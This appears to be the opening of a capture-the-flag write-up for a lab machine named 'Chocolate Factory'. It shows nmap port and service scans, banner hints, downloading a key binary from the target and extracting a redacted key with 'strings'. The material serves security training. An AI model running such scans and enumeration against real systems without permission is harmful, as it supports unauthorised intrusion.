#Chocolate Factory
Enumerating with nmap gives us:
```
➜  ~ nmap 10.10.231.176 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-23 12:44 CET
Nmap scan report for 10.10.231.176
Host is up (0.34s latency).
Not shown: 958 closed ports, 31 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
100/tcp open  newacct
106/tcp open  pop3pw
109/tcp open  pop2
110/tcp open  pop3
111/tcp open  rpcbind
113/tcp open  ident
119/tcp open  nntp
125/tcp open  locus-map

Nmap done: 1 IP address (1 host up) scanned in 116.04 seconds
```
Running a service scan on the open ports shows us:
```
➜  ~ nmap -p21,22,80,100,106,109,110,111,113,119,125 -sV 10.10.231.176 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-23 12:48 CET
Nmap scan report for 10.10.231.176
Host is up (0.68s latency).

PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.3
22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
100/tcp open  newacct?
106/tcp open  pop3pw?
109/tcp open  pop2?
110/tcp open  pop3?
111/tcp open  rpcbind?
113/tcp open  ident?
119/tcp open  nntp?
125/tcp open  locus-map?
8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port100-TCP:V=7.91%I=7%D=1/23%Time=600C0CFC%P=x86_64-unknown-linux-gnu%
SF:r(NULL,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(
SF:GenericLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x2
SF:0\x20\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.-------------
SF:--\.\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20
SF:\x20____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20
SF:__\\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20
SF:\\\\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\_
SF:__\x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x
SF:20__:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\
SF:\r\n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------
SF:----------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20
SF:\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\
SF:\|______________________;________________\|\r\n\r\nA\x20small\x20hint\x
SF:20from\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x2
SF:0here!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x2
SF:0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port106-TCP:V=7.91%I=7%D=1/23%Time=600C0CFC%P=x86_64-unknown-linux-gnu%
SF:r(NULL,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(
SF:GenericLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x2
SF:0\x20\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.-------------
SF:--\.\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20
SF:\x20____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20
SF:__\\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20
SF:\\\\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\_
SF:__\x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x
SF:20__:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\
SF:\r\n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------
SF:----------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20
SF:\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\
SF:\|______________________;________________\|\r\n\r\nA\x20small\x20hint\x
SF:20from\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x2
SF:0here!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x2
SF:0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port109-TCP:V=7.91%I=7%D=1/23%Time=600C0CFC%P=x86_64-unknown-linux-gnu%
SF:r(NULL,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(
SF:GenericLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x2
SF:0\x20\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.-------------
SF:--\.\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20
SF:\x20____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20
SF:__\\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20
SF:\\\\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\_
SF:__\x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x
SF:20__:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\
SF:\r\n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------
SF:----------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20
SF:\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\
SF:\|______________________;________________\|\r\n\r\nA\x20small\x20hint\x
SF:20from\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x2
SF:0here!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x2
SF:0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port110-TCP:V=7.91%I=7%D=1/23%Time=600C0CFC%P=x86_64-unknown-linux-gnu%
SF:r(NULL,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(
SF:GenericLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x2
SF:0\x20\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.-------------
SF:--\.\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20
SF:\x20____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20
SF:__\\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20
SF:\\\\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\_
SF:__\x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x
SF:20__:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\
SF:\r\n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------
SF:----------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20
SF:\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\
SF:\|______________________;________________\|\r\n\r\nA\x20small\x20hint\x
SF:20from\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x2
SF:0here!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x2
SF:0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port111-TCP:V=7.91%I=7%D=1/23%Time=600C0CFC%P=x86_64-unknown-linux-gnu%
SF:r(NULL,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(
SF:RPCCheck,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x2
SF:0\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.
SF:\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20
SF:____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\
SF:/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\
SF:'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x
SF:20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__
SF::\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n
SF:\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------
SF:------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\
SF:x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__
SF:____________________;________________\|\r\n\r\nA\x20small\x20hint\x20fr
SF:om\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20her
SF:e!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port113-TCP:V=7.91%I=7%D=1/23%Time=600C0CFC%P=x86_64-unknown-linux-gnu%
SF:r(NULL,3E,"http://localhost/key_rev_key\x20<-\x20You\x20will\x20find\x2
SF:0the\x20key\x20here!!!\n")%r(GenericLines,3E,"http://localhost/key_rev_
SF:key\x20<-\x20You\x20will\x20find\x20the\x20key\x20here!!!\n")%r(GetRequ
SF:est,3E,"http://localhost/key_rev_key\x20<-\x20You\x20will\x20find\x20th
SF:e\x20key\x20here!!!\n")%r(Help,3E,"http://localhost/key_rev_key\x20<-\x
SF:20You\x20will\x20find\x20the\x20key\x20here!!!\n")%r(RTSPRequest,3E,"ht
SF:tp://localhost/key_rev_key\x20<-\x20You\x20will\x20find\x20the\x20key\x
SF:20here!!!\n")%r(RPCCheck,3E,"http://localhost/key_rev_key\x20<-\x20You\
SF:x20will\x20find\x20the\x20key\x20here!!!\n")%r(DNSVersionBindReqTCP,3E,
SF:"http://localhost/key_rev_key\x20<-\x20You\x20will\x20find\x20the\x20ke
SF:y\x20here!!!\n")%r(TerminalServerCookie,3E,"http://localhost/key_rev_ke
SF:y\x20<-\x20You\x20will\x20find\x20the\x20key\x20here!!!\n")%r(LDAPBindR
SF:eq,3E,"http://localhost/key_rev_key\x20<-\x20You\x20will\x20find\x20the
SF:\x20key\x20here!!!\n")%r(LANDesk-RC,3E,"http://localhost/key_rev_key\x2
SF:0<-\x20You\x20will\x20find\x20the\x20key\x20here!!!\n")%r(TerminalServe
SF:r,3E,"http://localhost/key_rev_key\x20<-\x20You\x20will\x20find\x20the\
SF:x20key\x20here!!!\n")%r(JavaRMI,3E,"http://localhost/key_rev_key\x20<-\
SF:x20You\x20will\x20find\x20the\x20key\x20here!!!\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port119-TCP:V=7.91%I=7%D=1/23%Time=600C0CFC%P=x86_64-unknown-linux-gnu%
SF:r(NULL,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(
SF:GenericLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x2
SF:0\x20\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.-------------
SF:--\.\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20
SF:\x20____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20
SF:__\\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20
SF:\\\\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\_
SF:__\x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x
SF:20__:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\
SF:\r\n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------
SF:----------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20
SF:\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\
SF:\|______________________;________________\|\r\n\r\nA\x20small\x20hint\x
SF:20from\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x2
SF:0here!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x2
SF:0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port125-TCP:V=7.91%I=7%D=1/23%Time=600C0CFC%P=x86_64-unknown-linux-gnu%
SF:r(NULL,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(
SF:GenericLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x2
SF:0\x20\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.-------------
SF:--\.\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20
SF:\x20____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20
SF:__\\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20
SF:\\\\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\_
SF:__\x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x
SF:20__:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\
SF:\r\n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------
SF:----------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20
SF:\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\
SF:\|______________________;________________\|\r\n\r\nA\x20small\x20hint\x
SF:20from\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x2
SF:0here!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x2
SF:0");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.92 seconds
```
On port 113 we can see that the fingerprint gives us a hint: `"http://localhost/key_rev_key <- You will find the key here!!!\n`
By accessing the http service we can download the key:
```
➜  /tmp wget http://10.10.231.176/key_rev_key
--2021-01-23 12:55:28--  http://10.10.231.176/key_rev_key
Connecting to 10.10.231.176:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8496 (8,3K)
Saving to: ‘key_rev_key’

key_rev_key               100%[====================================>]   8,30K  --.-KB/s    in 0,004s  

2021-01-23 12:55:30 (1,92 MB/s) - ‘key_rev_key’ saved [8496/8496]
```
Running `file` on the file shows us that it's an executable:
```
➜  /tmp file key_rev_key 
key_rev_key: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8273c8c59735121c0a12747aee7ecac1aabaf1f0, not stripped
```
Running `strings` on the file reveals the key:
```
➜  /tmp strings -n 15 key_rev_key 
/lib64/ld-linux-x86-64.so.2
__stack_chk_fail
__libc_start_main
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
Enter your name: 
 congratulations you have found the key:   
b'<REDACTED>'
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
deregister_tm_clones
__do_global_dtors_aux
__do_global_dtors_aux_fini_array_entry
__frame_dummy_init_array_entry
__init_array_end
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
__stack_chk_fail@@GLIBC_2.4
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
strcmp@@GLIBC_2.2.5
__libc_csu_init
__isoc99_scanf@@GLIBC_2.7
